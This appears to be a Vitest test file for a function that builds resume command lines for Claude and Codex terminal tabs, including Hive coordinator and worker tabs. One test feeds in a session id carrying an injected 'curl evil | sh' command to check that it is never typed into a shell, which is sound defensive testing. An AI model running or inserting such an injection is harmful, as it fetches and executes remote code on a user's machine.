import { beforeEach, describe, expect, it, vi } from 'vitest';

const hiveLaunchCommand = vi.fn();
const dispatch = vi.fn();
const vars = new Map<string, Record<string, string>>();
const tabs: Record<string, { hive_role?: string | null; runtime?: string }> = {};

vi.mock('$lib/tauri/commands', () => ({ hiveLaunchCommand }));
vi.mock('$lib/stores/notificationDispatch', () => ({ dispatch }));
vi.mock('@tauri-apps/plugin-log', () => ({ error: vi.fn() }));
vi.mock('$lib/stores/workspaces.svelte', () => ({
  workspacesStore: {
    _locateTab: (id: string) => (tabs[id] ? { workspaceId: 'w', paneId: 'p', tab: { id, ...tabs[id] } } : null),
    getTabRuntime: (id: string) => tabs[id]?.runtime ?? 'claude',
  },
}));
vi.mock('$lib/stores/agentState.svelte', () => ({
  resumeCommandFor: (rt: string) => (rt === 'codex' ? 'codex resume %codexSessionId' : 'claude --resume %claudeSessionId'),
}));
vi.mock('$lib/stores/triggers.svelte', async () => {
  const { interpolateShellWith } = await import('$lib/triggers/shellInterpolate');
  return {
    interpolateShell: (tabId: string, text: string, clear = false) =>
      interpolateShellWith(new Map(Object.entries(vars.get(tabId) ?? {})), text, clear),
  };
});

const { relaunchLine } = await import('./launch');

const BUILT = "cd '/data/hive/h1/coordinator/home' && env CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1 claude --settings '/x' --resume 's1'";

describe('relaunchLine', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vars.clear();
    for (const k of Object.keys(tabs)) delete tabs[k];
  });

  it('an ordinary tab resumes its own session', async () => {
    tabs.t = { runtime: 'claude' };
    vars.set('t', { claudeSessionId: 'abc' });
    expect(await relaunchLine('t')).toBe('claude --resume abc');
    expect(hiveLaunchCommand).not.toHaveBeenCalled();
  });

  it('an ordinary tab with no session id keeps the % for its caller to refuse', async () => {
    tabs.t = { runtime: 'codex' };
    expect(await relaunchLine('t')).toBe('codex resume %codexSessionId');
  });

  it('a session id a shell would act on is never typed: the % stays for its caller to refuse', async () => {
    tabs.t = { runtime: 'claude' };
    vars.set('t', { claudeSessionId: 'abc; curl evil | sh' });
    expect(await relaunchLine('t')).toBe('claude --resume %claudeSessionId');
  });

  it('a Hive tab gets the builder line, typed as Rust built it', async () => {
    tabs.c = { hive_role: 'coordinator' };
    vars.set('c', { claudeSessionId: 'abc' });
    hiveLaunchCommand.mockResolvedValue(BUILT);
    expect(await relaunchLine('c')).toBe(BUILT);
    expect(hiveLaunchCommand).toHaveBeenCalledWith('c');
  });

  it('a refused Hive launch is surfaced and yields nothing to type, never the generic resume', async () => {
    tabs.c = { hive_role: 'coordinator' };
    vars.set('c', { claudeSessionId: 'abc' });
    hiveLaunchCommand.mockRejectedValue('launch record missing');
    const line = await relaunchLine('c');
    expect(line).toBeNull();
    expect(dispatch).toHaveBeenCalledOnce();
    expect(dispatch.mock.calls[0][1]).toContain('launch record missing');
    expect(dispatch.mock.calls[0][3]).toEqual({ tabId: 'c' });
  });

  it('a Hive tab never yields claude --resume %claudeSessionId', async () => {
    tabs.k = { hive_role: 'worker' };
    hiveLaunchCommand.mockResolvedValue(BUILT);
    expect(await relaunchLine('k')).not.toContain('%claudeSessionId');
    hiveLaunchCommand.mockRejectedValue('nope');
    expect(await relaunchLine('k')).toBeNull();
  });
});
